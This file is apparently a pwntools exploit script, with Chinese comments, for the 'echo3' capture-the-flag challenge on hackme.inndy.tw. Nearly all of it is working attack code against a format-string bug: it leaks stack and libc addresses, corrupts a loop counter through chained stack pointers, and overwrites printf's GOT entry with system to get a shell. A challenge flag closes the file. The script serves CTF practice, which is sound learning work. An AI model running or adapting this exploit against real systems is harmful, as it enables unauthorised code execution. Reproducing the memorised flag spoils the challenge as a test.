#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
{32: 1024, 48: 1024, 64: 1024, 4128: 1024, 4144: 1024, 4160: 1024, 8224: 1024, 8240: 1024, 8256: 1024, 16: 512, 80: 512, 4112: 512, 4176: 512, 8208: 512, 8272: 512, 12320: 16, 12336: 16, 12352: 16, 12304: 8, 12368: 2}
20

栈上制造空间一共20种情况

b *0x08048737  read magic
b *0x08048774  分配栈空间
b read + 5
b *0x08048646  printf

%18$p#%18$s  # 读取ebp，和下一个ebp的地址

"""


import re, sys, os.path as path, struct
from pwn import *
from pwnlib import gdb


context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "echo3_patched")
_, host, port = re.split("\s+", "nc hackme.inndy.tw 7720")

elf = ELF(elf_name)
# io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
libc = elf.libc


class Actor:
    def __init__(self, io):
        self.io = io
        self.random_bytes = 0  # TODO: 随机化情况需要修改
        self.esp_addr = None
        self.ebp0addr = None
        self.ebp1addr = None
        self.p0idx = 88 // 4
        self.p1idx = (316 + self.random_bytes) // 4
        self.p2idx = None
        self.p0addr = None
        self.p1addr = None
        self.p2addr = None
        self.i_addr = None

    def detect_random(self):
        l = [16, 32, 48, 64, 80]
        payload = "".join(["%{}$p@%{}$p#".format(34 + x // 4, 35 + x // 4) for x in l])
        payload += "%18$p@%19$p$$$$$$$$\0"
        self.io.sendline(payload)
        r = self.io.recvuntil("$$$$$$$$", drop=True)
        a = r.split(b"#")
        x = a[-1].split(b"@")
        assert x[1] == b"0x804877b"
        for x in a[:-1]:
            y = x.split(b"@")
            
        log.info(r)
        log.info(a)

    def get_libc_and_stack_addr(self):
        # 获取libc与栈地址
        payload = "%18$p#%19$p#%34$p#%35$p$$$$$$$$\0"
        self.io.sendline(payload)
        r = self.io.recvuntil("$$$$$$$$", drop=True)
        a = r.split(b"#")
        assert a[1] == b"0x804877b" and a[2] == b"(nil)"
        self.ebp1addr = int(a[0], 16)
        log.info("ebp1addr = 0x%x", self.ebp1addr)
        self.esp_addr = self.ebp1addr - self.random_bytes - 136
        log.info("esp_addr = 0x%x", self.esp_addr)
        libc_addr = int(a[3], 16)
        log.info("libc_addr = 0x%x", libc_addr)
        libc.address = (libc_addr - 0x18000) & 0xfffff000
        log.info("libc_basse = 0x%x", libc.address)

    def get_var_i_addr(self):
        # 获取变量i的地址
        self.ebp0addr = self.esp_addr + 72
        log.info("ebp0addr = 0x%x", self.ebp0addr)
        
        self.p0addr = self.esp_addr + 88
        log.info("p0addr = 0x%x", self.p0addr)
        self.p1addr = self.esp_addr + self.random_bytes + 316
        log.info("p1addr = 0x%x", self.p1addr)
        self.i_addr = self.ebp0addr - 0x14
        log.info("i_addr = 0x%x", self.i_addr)

    def set_var_i_minus(self):
        # 修改变量i
        # 0088| 0xffffd448 --> 0xffffd52c --> 0xffffd6b2 ("USER=admin")
        # 上面有三重指针，而且指针均在栈上可被printf访问。逐级改写地址，使最后一个指向变量i
        assert (self.i_addr + 3) & 0xffff == (self.i_addr & 0xffff) + 3  # 为了修改最高位，使其变为负数
        payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=self.p0idx, data=(self.i_addr + 3) & 0xffff)
        self.io.sendline(payload)
        self.io.recvuntil("$$$$$$$$", drop=True)
        payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=self.p1idx, data=0x80)
        self.io.sendline(payload)
        self.io.recvuntil("$$$$$$$$", drop=True)

    def write_printf_got_addresses(self):
        self.p2addr = (self.p1addr & 0xffffff00) + 0x100
        log.info("p2addr = 0x%x", self.p2addr)
        self.p2idx = (self.p2addr - self.esp_addr) // 4
        payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=self.p0idx, data=self.p2addr & 0xffff)
        self.io.sendline(payload)
        self.io.recvuntil("$$$$$$$$", drop=True)

        a = elf.got["printf"]
        gots = struct.pack("<IIII", a, a + 1, a + 2, a + 3)
        for i in range(16):
            if i > 0:
                payload = "%{data}c%{p0idx}$hhn$$$$$$$$\0".format(p0idx=self.p0idx, data=(self.p2addr & 0xff) + i)
                self.io.sendline(payload)
                self.io.recvuntil("$$$$$$$$", drop=True)
            payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=self.p1idx, data=gots[i])
            self.io.sendline(payload)
            self.io.recvuntil("$$$$$$$$", drop=True)

    def write_system_to_printf_got(self):
        a = libc.sym["system"]
        l = [0]
        for i in range(4):
            byte = (((a >> (i * 8)) & 0xff) - sum(l)) & 0xff
            if byte == 0:
                byte = 256
            l.append(byte)
        l = l[1:]
        payload = "".join(["%{}c%{}$hhn".format(data, self.p2idx + i) for i, data in enumerate(l)]) + "$$$$$$$$\0"
        self.io.sendline(payload)
        self.io.recvuntil("$$$$$$$$", drop=True)

    def main(self):
        self.get_libc_and_stack_addr()
        self.get_var_i_addr()
        self.set_var_i_minus()
        self.write_printf_got_addresses()
        self.write_system_to_printf_got()


def main():
    while 1:
        try:
            io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
            actor = Actor(io)
            actor.detect_random()
            # actor.main()
            # io.sendline("/bin/sh")
            io.interactive()
        except KeyboardInterrupt:
            exit(0)
        except Exception as e:
            log.error(e)


if __name__ == "__main__":
    main()

# CTF{081ecc7c8d658409eb43358dcc1cf446}